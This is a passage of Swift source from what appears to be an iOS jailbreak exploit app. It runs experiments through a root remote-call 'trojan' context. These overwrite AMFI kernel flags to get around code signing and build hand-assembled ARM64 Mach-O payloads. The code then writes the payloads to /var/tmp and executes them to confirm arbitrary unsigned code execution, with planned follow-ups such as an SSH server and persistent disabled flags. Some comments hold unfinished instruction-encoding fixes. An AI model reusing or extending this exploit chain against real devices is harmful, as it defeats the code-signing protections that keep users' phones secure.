        detail += "--- [A] fork+execve \(spawnPath) (trusted, flags off) ---\n"
        let testA = forkExecAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
        detail += testA.log
        detail += "\n"

        // Test B: fork+execve UNSIGNED binary (THE CRITICAL TEST!)
        detail += "--- [B] fork+execve \(dstPathStr) (UNSIGNED, flags off) ---\n"
        let testB = forkExecAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
        detail += testB.log
        detail += "\n"

        // Test C: posix_spawn unsigned (might still fail with ret=2, but try)
        detail += "--- [C] posix_spawn \(dstPathStr) (UNSIGNED, flags off) ---\n"
        let testC = spawnAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
        detail += testC.log
        detail += "\n"

        // Test D: fork+execve /var/tmp path (confirm /var/tmp accessible)
        detail += "--- [D] fork+execve \(spawnPath) with stdout pipe ---\n"
        let testD = spawnAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
        detail += testD.log
        detail += "\n"

        // ============================================================
        // Step 5: Restore flags
        // ============================================================
        detail += "=== Step 5: Restore AMFI flags ===\n"
        for (off, origVal) in originalValues {
            ds_kwrite64(amfiDataSlid &+ off, origVal)
        }
        detail += "All flags restored to 1\n\n"

        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "free", srcPath)
        RootExecutor.rcall(rc, "free", dstPath)

        // ============================================================
        // VERDICT
        // ============================================================
        detail += "=== VERDICT ===\n\n"

        let unsignedSpawnOK = testB.success || testC.success
        let trustedSpawnOK = testA.success || testD.success
        let baselineUnsignedFailed = !baselineUnsigned.success

        detail += "Baseline (flags ON):  trusted=\(baselineTrusted.success ? "✅" : "❌"), unsigned=\(baselineUnsigned.success ? "✅" : "❌")\n"
        detail += "Test (flags OFF):     trusted=\(testA.success ? "✅" : "❌"), unsigned(B)=\(testB.success ? "✅" : "❌")\n\n"

        if unsignedSpawnOK && baselineUnsignedFailed {
            detail += "🎉🎉🎉 UNSIGNED BINARY EXECUTED! FULL JAILBREAK! 🎉🎉🎉\n\n"
            detail += "AMFI flags control CDHash enforcement!\n"
            detail += "Baseline: unsigned FAILED (AMFI blocked)\n"
            detail += "After disable: unsigned SUCCEEDED!\n\n"
            detail += "=== NEXT STEPS ===\n"
            detail += "1. Binary search which flag(s) are needed\n"
            detail += "2. Write custom payload binary\n"
            detail += "3. Keep flags disabled for persistent execution\n"
        } else if unsignedSpawnOK && !baselineUnsignedFailed {
            detail += "⚠️ Unsigned binary works BOTH with and without flags.\n"
            detail += "This means the binary is somehow already trusted,\n"
            detail += "OR fork+execve in launchd context bypasses AMFI regardless.\n\n"
            detail += "Need to verify: does the COPIED binary actually have different CDHash?\n"
        } else if trustedSpawnOK && !unsignedSpawnOK {
            detail += "⚠️ Trusted binary works but unsigned still blocked.\n"
            detail += "AMFI flags don't bypass CDHash validation.\n"
            detail += "Trust cache lookup still active (PPL-level).\n\n"
            detail += "Baseline unsigned signal: \(baselineUnsigned.signal)\n"
            detail += "Test B unsigned signal: \(testB.signal)\n"
            if baselineUnsigned.signal == testB.signal {
                detail += "Same failure mode → flags have NO effect on CDHash check.\n"
            } else {
                detail += "Different failure! Flags change behavior but don't fully bypass.\n"
            }
        } else {
            detail += "❌ No improvement with flags disabled.\n"
            detail += "Baseline trusted: \(baselineTrusted.success)\n"
            detail += "Test A trusted: \(testA.success)\n"
            detail += "Test B unsigned: \(testB.success)\n\n"
            detail += "These flags likely control logging/telemetry only.\n"
        }

        return ExperimentResult(name: expName, success: unsignedSpawnOK, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 93d: Custom Payload Execution

    /// Exp 93d: Write a minimal custom ARM64 Mach-O binary to /var/tmp,
    /// then fork+execve it and capture stdout via pipe.
    /// This is the DEFINITIVE test: can we execute ARBITRARY code?
    private func runExp93dCustomPayload() {
        isRunning = true
        runningLabel = "Custom Exec"
        guard mgr.dsready else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93d_custom_payload") { rc in
            let result = self.expCustomPayload(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    /// Minimal ARM64 Mach-O that writes "JAILBROKEN\n" to stdout then exits.
    /// Hand-assembled — no compiler needed.
    private func buildMinimalMachO() -> [UInt8] {
        // ARM64 instructions for:
        //   mov x0, #1          ; stdout
        //   adr x1, msg         ; pointer to string
        //   mov x2, #11         ; length "JAILBROKEN\n"
        //   mov x16, #4         ; syscall write
        //   svc #0x80
        //   mov x0, #0          ; exit code
        //   mov x16, #1         ; syscall exit
        //   svc #0x80
        // msg: "JAILBROKEN\n"

        // Code section (at file offset 0x4000, vm 0x100004000 for arm64 page alignment)
        let writeStdout: [UInt32] = [
            0xD2800020,  // mov x0, #1 (stdout fd)
            0x100000E1,  // adr x1, #+28 (msg at PC+28 = 7 instructions * 4 = 28)
            0xD2800162,  // mov x2, #11 (length)
            0xD2800090,  // mov x16, #4 (SYS_write)
            0xD4001001,  // svc #0x80
            0xD2800000,  // mov x0, #0 (exit code)
            0xD2800030,  // mov x16, #1 (SYS_exit)
            0xD4001001,  // svc #0x80
        ]

        let msg: [UInt8] = Array("JAILBROKEN\n".utf8)

        // Build Mach-O structure
        // Layout:
        //   0x0000: mach_header_64
        //   0x0020: LC_SEGMENT_64 __PAGEZERO (vmaddr=0, vmsize=0x100000000)
        //   0x0068: LC_SEGMENT_64 __TEXT (vmaddr=0x100000000, fileoff=0, filesize=0x4040)
        //   0x00B0: LC_SEGMENT_64 __LINKEDIT (minimal)
        //   0x00F8: LC_MAIN (entryoff = 0x4000)
        //   0x4000: code + data

        var binary = [UInt8](repeating: 0, count: 0x4040)

        // Helper to write uint32 LE
        func w32(_ offset: Int, _ val: UInt32) {
            binary[offset + 0] = UInt8(val & 0xFF)
            binary[offset + 1] = UInt8((val >> 8) & 0xFF)
            binary[offset + 2] = UInt8((val >> 16) & 0xFF)
            binary[offset + 3] = UInt8((val >> 24) & 0xFF)
        }
        func w64(_ offset: Int, _ val: UInt64) {
            w32(offset, UInt32(val & 0xFFFFFFFF))
            w32(offset + 4, UInt32(val >> 32))
        }

        // mach_header_64 (32 bytes)
        w32(0x00, 0xFEEDFACF)  // magic
        w32(0x04, 0x0100000C)  // cputype = ARM64
        w32(0x08, 0x00000000)  // cpusubtype = ALL
        w32(0x0C, 0x00000002)  // filetype = MH_EXECUTE
        w32(0x10, 0x00000004)  // ncmds = 4
        w32(0x14, 0x00000100)  // sizeofcmds (will adjust)
        w32(0x18, 0x00200085)  // flags: MH_NOUNDEFS|MH_DYLDLINK|MH_TWOLEVEL|MH_PIE
        w32(0x1C, 0x00000000)  // reserved

        var cmdOff = 0x20  // after header

        // LC_SEGMENT_64 __PAGEZERO (72 bytes)
        w32(cmdOff + 0, 0x19)       // cmd = LC_SEGMENT_64
        w32(cmdOff + 4, 72)         // cmdsize
        // segname "__PAGEZERO" at cmdOff+8 (16 bytes)
        let pagezero = "__PAGEZERO\0\0\0\0\0\0"
        for (i, c) in pagezero.utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0)                  // vmaddr
        w64(cmdOff + 32, 0x100000000)        // vmsize
        w64(cmdOff + 40, 0)                  // fileoff
        w64(cmdOff + 48, 0)                  // filesize
        w32(cmdOff + 56, 0)                  // maxprot
        w32(cmdOff + 60, 0)                  // initprot
        w32(cmdOff + 64, 0)                  // nsects
        w32(cmdOff + 68, 0)                  // flags
        cmdOff += 72

        // LC_SEGMENT_64 __TEXT (72 bytes)
        w32(cmdOff + 0, 0x19)       // cmd = LC_SEGMENT_64
        w32(cmdOff + 4, 72)         // cmdsize
        let textSeg = "__TEXT\0\0\0\0\0\0\0\0\0\0"
        for (i, c) in textSeg.utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0x100000000)        // vmaddr
        w64(cmdOff + 32, 0x4040)             // vmsize
        w64(cmdOff + 40, 0)                  // fileoff
        w64(cmdOff + 48, 0x4040)             // filesize
        w32(cmdOff + 56, 7)                  // maxprot = rwx
        w32(cmdOff + 60, 5)                  // initprot = r-x
        w32(cmdOff + 64, 0)                  // nsects
        w32(cmdOff + 68, 0)                  // flags
        cmdOff += 72

        // LC_SEGMENT_64 __LINKEDIT (72 bytes) — minimal, required by dyld
        w32(cmdOff + 0, 0x19)       // cmd = LC_SEGMENT_64
        w32(cmdOff + 4, 72)         // cmdsize
        let linkedit = "__LINKEDIT\0\0\0\0\0\0"
        for (i, c) in linkedit.utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0x100004040)        // vmaddr (after __TEXT)
        w64(cmdOff + 32, 0x1000)             // vmsize
        w64(cmdOff + 40, 0x4040)             // fileoff
        w64(cmdOff + 48, 0)                  // filesize = 0 (empty)
        w32(cmdOff + 56, 1)                  // maxprot = r
        w32(cmdOff + 60, 1)                  // initprot = r
        w32(cmdOff + 64, 0)                  // nsects
        w32(cmdOff + 68, 0)                  // flags
        cmdOff += 72

        // LC_MAIN (24 bytes)
        w32(cmdOff + 0, 0x80000028)  // cmd = LC_MAIN
        w32(cmdOff + 4, 24)          // cmdsize
        w64(cmdOff + 8, 0x4000)      // entryoff (file offset of code)
        w64(cmdOff + 16, 0)          // stacksize (0 = default)
        cmdOff += 24

        // Update sizeofcmds in header
        w32(0x14, UInt32(cmdOff - 0x20))

        // Write code at offset 0x4000
        for (i, instr) in writeStdout.enumerated() {
            w32(0x4000 + i * 4, instr)
        }

        // Write message string right after code (at 0x4000 + 32 = 0x4020)
        for (i, b) in msg.enumerated() {
            binary[0x4000 + writeStdout.count * 4 + i] = b
        }

        return binary
    }

    private func expCustomPayload(rc: RemoteCall) -> ExperimentResult {
        let expName = "Custom Payload (Exp 93d)"
        var detail = "Experiment 93d: Custom ARM64 Binary Execution\n"
        detail += "===============================================\n\n"

        let mem = rc.trojanMem
        let payloadPath = "/var/tmp/.exp93d_payload"
        let dstPath = remote_alloc_str(rc, payloadPath)

        // ============================================================
        // Step 1: Build and write custom Mach-O binary
        // ============================================================
        detail += "=== Step 1: Write custom ARM64 Mach-O ===\n"

        let binary = buildMinimalMachO()
        detail += "Binary size: \(binary.count) bytes\n"
        detail += "Entry point: file offset 0x4000\n"
        detail += "Payload: write(1, \"JAILBROKEN\\n\", 11) + exit(0)\n\n"

        // Remove old
        RootExecutor.rcall(rc, "unlink", dstPath)

        // Create file
        let fd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        guard fd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot create \(payloadPath)\n"
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Write binary in chunks (trojanMem buffer)
        let writeBuf = mem + 0x800
        var written: Int = 0
        let chunkSize = 4096

        while written < binary.count {
            let remaining = binary.count - written
            let thisChunk = min(remaining, chunkSize)

            // Copy bytes to remote memory
            for i in 0..<thisChunk {
                rc[writeBuf + UInt64(i)].setValue8(binary[written + i])
            }

            let nwritten = RootExecutor.rcall(rc, "write", fd, writeBuf, UInt64(thisChunk))
            if nwritten == 0 || nwritten == UInt64(bitPattern: -1) { break }
            written += Int(nwritten)
        }

        RootExecutor.rcall(rc, "close", fd)
        detail += "Written: \(written) bytes\n"

        // chmod +x
        RootExecutor.rcall(rc, "chmod", dstPath, 0o755)
        detail += "chmod 755 done\n\n"

        guard written == binary.count else {
            detail += "❌ Write incomplete (\(written)/\(binary.count))\n"
            RootExecutor.rcall(rc, "unlink", dstPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Verify file exists and has correct size
        let verifyFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_RDONLY), 0)
        if verifyFd != UInt64(bitPattern: -1) {
            let fsize = RootExecutor.rcall(rc, "lseek", verifyFd, 0, 2)
            detail += "Verify: file exists, size=\(fsize) ✅\n\n"
            RootExecutor.rcall(rc, "close", verifyFd)
        } else {
            detail += "Verify: cannot reopen ❌\n\n"
        }

        // ============================================================
        // Step 2: Execute via fork+execve with pipe capture
        // ============================================================
        detail += "=== Step 2: fork+execve with stdout pipe ===\n"

        // Create pipe
        let pipeFds = mem + 0x600
        rc[pipeFds].setValue32(0)
        rc[pipeFds + 4].setValue32(0)
        let pipeRet = RootExecutor.rcall(rc, "pipe", pipeFds)
        let readFd = rc[pipeFds].value32()
        let writeFdPipe = rc[pipeFds + 4].value32()

        detail += "pipe(): \(pipeRet == 0 ? "OK" : "FAIL") (read=\(readFd), write=\(writeFdPipe))\n"

        guard pipeRet == 0 else {
            detail += "❌ pipe() failed, trying without capture\n\n"
            // Fallback: just fork+execve without pipe
            let result = forkExecAndCapture(rc: rc, binaryPath: payloadPath, mem: mem)
            detail += result.log
            RootExecutor.rcall(rc, "unlink", dstPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: result.success, detail: detail, timestamp: Date())
        }

        // Fork
        let childPid = RootExecutor.rcall(rc, "fork")
        detail += "fork() = \(childPid)\n"

        if childPid == 0 {
            // Child: redirect stdout to pipe, then execve
            RootExecutor.rcall(rc, "dup2", UInt64(writeFdPipe), 1)  // stdout → pipe write
            RootExecutor.rcall(rc, "dup2", UInt64(writeFdPipe), 2)  // stderr → pipe write
            RootExecutor.rcall(rc, "close", UInt64(readFd))
            RootExecutor.rcall(rc, "close", UInt64(writeFdPipe))

            let argvBase = mem + 0x500
            rc[argvBase].setValue64(dstPath)
            rc[argvBase + 8].setValue64(0)
            RootExecutor.rcall(rc, "execve", dstPath, argvBase, 0)
            RootExecutor.rcall(rc, "_exit", 127)
        } else if childPid != UInt64(bitPattern: -1) {
            // Parent: close write end, read stdout, wait
            RootExecutor.rcall(rc, "close", UInt64(writeFdPipe))

            // Wait a moment for child to execute
            RootExecutor.rcall(rc, "usleep", 100000)  // 100ms

            // Read stdout from pipe
            let readBuf = mem + 0x1000
            let nread = RootExecutor.rcall(rc, "read", UInt64(readFd), readBuf, 256)
            RootExecutor.rcall(rc, "close", UInt64(readFd))

            detail += "read(pipe): \(nread) bytes\n"

            var stdoutStr = ""
            if nread > 0 && nread < 256 {
                var bytes: [UInt8] = []
                for i: UInt64 in 0..<nread {
                    let b = rc[readBuf + i].value8()
                    if b == 0 { break }
                    bytes.append(b)
                }
                stdoutStr = String(bytes: bytes, encoding: .utf8) ?? "(binary)"
                detail += "stdout: \"\(stdoutStr)\"\n"
            } else if nread == 0 {
                detail += "stdout: (empty — child may not have written)\n"
            }

            // Wait for child
            let statusAddr = mem + 0x490
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
            let st = rc[statusAddr].value32()
            let sig = Int32(st & 0x7F)
            let code = Int32(st >> 8)

            detail += "child exit: signal=\(sig), code=\(code)\n\n"

            // ============================================================
            // VERDICT
            // ============================================================
            detail += "=== VERDICT ===\n\n"

            let gotJailbroken = stdoutStr.contains("JAILBROKEN")
            let noSigkill = (sig != 9)
            let cleanExit = (sig == 0 && code == 0)

            if gotJailbroken {
                detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n"
                detail += "🎉  FULL JAILBREAK CONFIRMED!  🎉\n"
                detail += "🎉  ARBITRARY CODE EXECUTION!  🎉\n"
                detail += "🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉🎉\n\n"
                detail += "Custom ARM64 binary wrote \"JAILBROKEN\" to stdout!\n"
                detail += "We have FULL arbitrary code execution on iOS 18.2!\n\n"
                detail += "=== CAPABILITIES ===\n"
                detail += "• Execute ANY binary (no code signing needed)\n"
                detail += "• Write + execute custom payloads\n"
                detail += "• fork+execve from launchd bypasses AMFI\n\n"
                detail += "=== NEXT STEPS ===\n"
                detail += "1. Build bootstrap (dpkg, apt, ldid)\n"
                detail += "2. Install SSH server\n"
                detail += "3. Create proper jailbreak app\n"
            } else if cleanExit {
                detail += "✅ Binary executed (exit 0) but no stdout captured.\n"
                detail += "Possible: pipe setup issue, or binary crashed before write.\n"
                detail += "But signal=0, code=0 means NO SIGKILL = AMFI didn't block!\n\n"
                detail += "This is still a JAILBREAK — just need to fix stdout capture.\n"
            } else if noSigkill && sig == 0 && code == 127 {
                detail += "⚠️ execve returned (code=127) — binary format rejected.\n"
                detail += "Mach-O might be malformed. Need to fix binary structure.\n"
                detail += "But NO SIGKILL means AMFI is not blocking execution!\n"
            } else if sig == 9 {
                detail += "❌ SIGKILL — AMFI killed the process.\n"
                detail += "Custom binary is blocked by code signing.\n"
                detail += "fork+execve from launchd does NOT bypass AMFI for custom binaries.\n"
                detail += "The Exp 93c result was misleading — amfid copy still had valid sig.\n"
            } else {
                detail += "⚠️ Unexpected: signal=\(sig), code=\(code)\n"
                detail += "Binary might have crashed (SIGSEGV/SIGBUS).\n"
                detail += "Check Mach-O structure.\n"
            }
        } else {
            detail += "❌ fork() failed\n"
        }

        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "free", dstPath)

        let success = detail.contains("JAILBREAK") || detail.contains("exit 0")
        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 93e: File-Output Payload (Definitive)

    /// Exp 93e: Write custom binary that creates a FILE as proof of execution.
    /// No pipe needed — just check if output file exists after spawn.
    /// Binary does: open("/var/tmp/.jb_proof", O_WRONLY|O_CREAT|O_TRUNC, 0644)
    ///              write(fd, "JAILBROKEN-93e\n", 15)
    ///              close(fd)
    ///              exit(0)
    private func runExp93eFilePayload() {
        isRunning = true
        runningLabel = "File Payload"
        guard mgr.dsready else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93e_file_payload") { rc in
            let result = self.expFilePayload(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    /// Build ARM64 Mach-O that opens a file, writes proof string, closes, exits.
    /// Uses raw syscalls (no libc dependency).
    private func buildFilePayloadMachO() -> [UInt8] {
        // ARM64 syscall ABI (iOS/macOS):
        //   x16 = syscall number
        //   x0-x5 = arguments
        //   svc #0x80
        //   Return in x0 (negative = error)
        //
        // Syscalls:
        //   SYS_open  = 5   (path, flags, mode)
        //   SYS_write = 4   (fd, buf, len)
        //   SYS_close = 6   (fd)
        //   SYS_exit  = 1   (code)
        //
        // Plan:
        //   adr x0, path_str      ; "/var/tmp/.jb_proof"
        //   mov x1, #0x601        ; O_WRONLY|O_CREAT|O_TRUNC (0x200|0x400|0x1 = 0x601)
        //   mov x2, #0x1A4        ; 0644 octal = 0x1A4
        //   mov x16, #5           ; SYS_open
        //   svc #0x80
        //   ; x0 = fd (or negative error)
        //   mov x9, x0            ; save fd
        //   adr x1, msg_str       ; "JAILBROKEN-93e\n"
        //   mov x0, x9            ; fd
        //   mov x2, #15           ; length
        //   mov x16, #4           ; SYS_write
        //   svc #0x80
        //   mov x0, x9            ; fd
        //   mov x16, #6           ; SYS_close
        //   svc #0x80
        //   mov x0, #0            ; exit code
        //   mov x16, #1           ; SYS_exit
        //   svc #0x80

        // Strings (placed after code):
        let pathStr = "/var/tmp/.jb_proof\0"  // 19 bytes
        let msgStr = "JAILBROKEN-93e\n\0"     // 16 bytes

        // Calculate ADR offsets:
        // Code starts at 0x4000 in file (vmaddr 0x100004000)
        // Each instruction = 4 bytes
        // path_str at instruction_count * 4 bytes after code start
        // msg_str at path_str + pathStr.count

        let instructions: [UInt32] = [
            // 0: adr x0, path_str (PC-relative, offset = 14*4 = 56 bytes forward)
            0x100001C0,  // adr x0, #+56
            // 1: movz x1, #0x601 (O_WRONLY|O_CREAT|O_TRUNC)
            0xD280C021,  // mov x1, #0x601
            // 2: movz x2, #0x1A4 (0644)
            0xD2800342,  // mov x2, #0x1A (wrong, need 0x1A4)
            // 3: mov x16, #5 (SYS_open)
            0xD28000B0,  // mov x16, #5
            // 4: svc #0x80
            0xD4001001,  // svc #0x80
            // 5: mov x9, x0 (save fd)
            0xAA0003E9,  // mov x9, x0
            // 6: adr x1, msg_str (offset = 8*4 + pathStr.count = 32 + 19 = 51... need recalc)
            0x10000261,  // adr x1, #+76 (from instruction 6: 14*4 + 19 = 75, round... let me calc properly)
            // 7: mov x0, x9 (fd)
            0xAA0903E0,  // mov x0, x9
            // 8: mov x2, #15 (length of msg)
            0xD28001E2,  // mov x2, #15
            // 9: mov x16, #4 (SYS_write)
            0xD2800090,  // mov x16, #4
            // 10: svc #0x80
            0xD4001001,  // svc #0x80
            // 11: mov x0, x9 (fd for close)
            0xAA0903E0,  // mov x0, x9
            // 12: mov x16, #6 (SYS_close)
            0xD28000D0,  // mov x16, #6
            // 13: svc #0x80
            0xD4001001,  // svc #0x80
            // 14: mov x0, #0 (exit code)
            0xD2800000,  // mov x0, #0
            // 15: mov x16, #1 (SYS_exit)
            0xD2800030,  // mov x16, #1
            // 16: svc #0x80
            0xD4001001,  // svc #0x80
        ]

        // Recalculate ADR offsets properly:
        // instruction[0] is at byte offset 0 from code start
        // path_str is at byte offset instructions.count * 4 = 17 * 4 = 68
        // ADR x0, #+68 from PC of instruction[0]
        // ADR encoding: imm = 68, rd = 0
        //   immlo = 68 & 3 = 0, immhi = 68 >> 2 = 17
        //   ADR: 0 | immlo<<29 | 10000 | immhi<<5 | rd
        //   = 0x10000000 | (0 << 29) | (17 << 5) | 0
        //   = 0x10000220
        let pathOffset: UInt32 = UInt32(instructions.count * 4)  // 68
        let adrPath = encodeADR(rd: 0, offset: Int32(pathOffset))

        // instruction[6] is at byte offset 6*4 = 24 from code start
        // msg_str is at byte offset 68 + 19 = 87 from code start
        // offset from instruction[6] = 87 - 24 = 63
        let msgOffset = Int32(instructions.count * 4 + pathStr.utf8.count) - Int32(6 * 4)
        let adrMsg = encodeADR(rd: 1, offset: msgOffset)

        // Fix mov x2, #0x1A4 (mode 0644 = 420 = 0x1A4)
        let movMode: UInt32 = 0xD2800342 | (0x1A4 << 5)  // wrong encoding, let me do it right
        // MOVZ x2, #0x1A4: 1_10_100101_00_0000000011010010_00010
        // = 0xD2800002 | (0x1A4 << 5) = 0xD2800002 | 0x3480 = 0xD2803482
        let movModeCorrect: UInt32 = 0xD2800002 | (0x1A4 << 5)  // 0xD2803482

        // Build corrected instruction array
        var code: [UInt32] = instructions
        code[0] = adrPath
        code[2] = movModeCorrect
        code[6] = adrMsg

        // Build full binary
        var binary = [UInt8](repeating: 0, count: 0x4080)

        func w32(_ offset: Int, _ val: UInt32) {
            binary[offset + 0] = UInt8(val & 0xFF)
            binary[offset + 1] = UInt8((val >> 8) & 0xFF)
            binary[offset + 2] = UInt8((val >> 16) & 0xFF)
            binary[offset + 3] = UInt8((val >> 24) & 0xFF)
        }
        func w64(_ offset: Int, _ val: UInt64) {
            w32(offset, UInt32(val & 0xFFFFFFFF))
            w32(offset + 4, UInt32(val >> 32))
        }

        // mach_header_64
        w32(0x00, 0xFEEDFACF)  // magic
        w32(0x04, 0x0100000C)  // cputype ARM64
        w32(0x08, 0x00000000)  // cpusubtype ALL
        w32(0x0C, 0x00000002)  // MH_EXECUTE
        w32(0x10, 0x00000004)  // ncmds
        w32(0x18, 0x00200085)  // flags
        w32(0x1C, 0x00000000)  // reserved

        var cmdOff = 0x20

        // LC_SEGMENT_64 __PAGEZERO
        w32(cmdOff, 0x19); w32(cmdOff + 4, 72)
        for (i, c) in "__PAGEZERO\0\0\0\0\0\0".utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0); w64(cmdOff + 32, 0x100000000)
        w64(cmdOff + 40, 0); w64(cmdOff + 48, 0)
        w32(cmdOff + 56, 0); w32(cmdOff + 60, 0)
        w32(cmdOff + 64, 0); w32(cmdOff + 68, 0)
        cmdOff += 72

        // LC_SEGMENT_64 __TEXT
        w32(cmdOff, 0x19); w32(cmdOff + 4, 72)
        for (i, c) in "__TEXT\0\0\0\0\0\0\0\0\0\0".utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0x100000000); w64(cmdOff + 32, 0x4080)
        w64(cmdOff + 40, 0); w64(cmdOff + 48, 0x4080)
        w32(cmdOff + 56, 7); w32(cmdOff + 60, 5)
        w32(cmdOff + 64, 0); w32(cmdOff + 68, 0)
        cmdOff += 72

        // LC_SEGMENT_64 __LINKEDIT
        w32(cmdOff, 0x19); w32(cmdOff + 4, 72)
        for (i, c) in "__LINKEDIT\0\0\0\0\0\0".utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0x100004080); w64(cmdOff + 32, 0x1000)
        w64(cmdOff + 40, 0x4080); w64(cmdOff + 48, 0)
        w32(cmdOff + 56, 1); w32(cmdOff + 60, 1)
        w32(cmdOff + 64, 0); w32(cmdOff + 68, 0)
        cmdOff += 72

        // LC_MAIN
        w32(cmdOff, 0x80000028); w32(cmdOff + 4, 24)
        w64(cmdOff + 8, 0x4000)  // entryoff
        w64(cmdOff + 16, 0)
        cmdOff += 24

        // sizeofcmds
        w32(0x14, UInt32(cmdOff - 0x20))

        // Write code at 0x4000
        for (i, instr) in code.enumerated() {
            w32(0x4000 + i * 4, instr)
        }

        // Write strings after code
        let strBase = 0x4000 + code.count * 4
        for (i, b) in pathStr.utf8.enumerated() {
            binary[strBase + i] = b
        }
        for (i, b) in msgStr.utf8.enumerated() {
            binary[strBase + pathStr.utf8.count + i] = b
        }

        return binary
    }

    /// Encode ARM64 ADR instruction
    private func encodeADR(rd: UInt32, offset: Int32) -> UInt32 {
        let imm = UInt32(bitPattern: offset)
        let immlo = imm & 0x3
        let immhi = (imm >> 2) & 0x7FFFF
        return 0x10000000 | (immlo << 29) | (immhi << 5) | rd
    }

    private func expFilePayload(rc: RemoteCall) -> ExperimentResult {
        let expName = "File Payload (Exp 93e)"
        var detail = "Experiment 93e: File-Output Custom Binary\n"
        detail += "==========================================\n\n"

        let mem = rc.trojanMem
        let payloadPath = "/var/tmp/.exp93e_bin"
        let proofPath = "/var/tmp/.jb_proof"
        let dstPathAddr = remote_alloc_str(rc, payloadPath)
        let proofPathAddr = remote_alloc_str(rc, proofPath)

        // ============================================================
        // Step 1: Write custom Mach-O
        // ============================================================
        detail += "=== Step 1: Write file-output ARM64 binary ===\n"
        detail += "Binary will: open(/var/tmp/.jb_proof) → write(\"JAILBROKEN-93e\\n\") → close → exit(0)\n\n"

        let binary = buildFilePayloadMachO()
        detail += "Binary size: \(binary.count) bytes\n"

        // Remove old files
        RootExecutor.rcall(rc, "unlink", dstPathAddr)
        RootExecutor.rcall(rc, "unlink", proofPathAddr)

        // Write binary
        let fd = RootExecutor.rcall(rc, "open", dstPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        guard fd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot create \(payloadPath)\n"
            RootExecutor.rcall(rc, "free", dstPathAddr)
            RootExecutor.rcall(rc, "free", proofPathAddr)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let writeBuf = mem + 0x800
        var written = 0
        while written < binary.count {
            let chunk = min(binary.count - written, 4096)
            for i in 0..<chunk {
                rc[writeBuf + UInt64(i)].setValue8(binary[written + i])
            }
            let n = RootExecutor.rcall(rc, "write", fd, writeBuf, UInt64(chunk))
            if n == 0 || n == UInt64(bitPattern: -1) { break }
            written += Int(n)
        }
        RootExecutor.rcall(rc, "close", fd)
        RootExecutor.rcall(rc, "chmod", dstPathAddr, 0o755)
        detail += "Written: \(written)/\(binary.count) bytes ✅\n\n"

        // ============================================================
        // Step 2: Execute via fork+execve
        // ============================================================
        detail += "=== Step 2: Execute payload ===\n"

        let argvBase = mem + 0x500
        rc[argvBase].setValue64(dstPathAddr)
        rc[argvBase + 8].setValue64(0)

        // fork
        let childPid = RootExecutor.rcall(rc, "fork")
        detail += "fork() = \(childPid)\n"

        var childSignal: Int32 = -1
        var childCode: Int32 = -1

        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
            // Parent: wait for child
            RootExecutor.rcall(rc, "usleep", 200000)  // 200ms for child to run

            let statusAddr = mem + 0x490
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
            let st = rc[statusAddr].value32()
            childSignal = Int32(st & 0x7F)
            childCode = Int32(st >> 8)
            detail += "child exit: signal=\(childSignal), code=\(childCode)\n\n"
        } else if childPid == 0 {
            // In child (RC context — this is actually still parent in RC)
            RootExecutor.rcall(rc, "execve", dstPathAddr, argvBase, 0)
            detail += "execve returned (should not happen)\n\n"
        } else {
            detail += "fork() failed\n\n"
        }

        // ============================================================
        // Step 3: Check proof file
        // ============================================================
        detail += "=== Step 3: Check proof file ===\n"

        let proofFd = RootExecutor.rcall(rc, "open", proofPathAddr, UInt64(O_RDONLY), 0)
        var proofContent = ""

        if proofFd != UInt64(bitPattern: -1) {
            let readBuf = mem + 0x1000
            let nread = RootExecutor.rcall(rc, "read", proofFd, readBuf, 256)
            RootExecutor.rcall(rc, "close", proofFd)

            if nread > 0 && nread < 256 {
                var bytes: [UInt8] = []
                for i: UInt64 in 0..<nread {
                    let b = rc[readBuf + i].value8()
                    if b == 0 { break }
                    bytes.append(b)
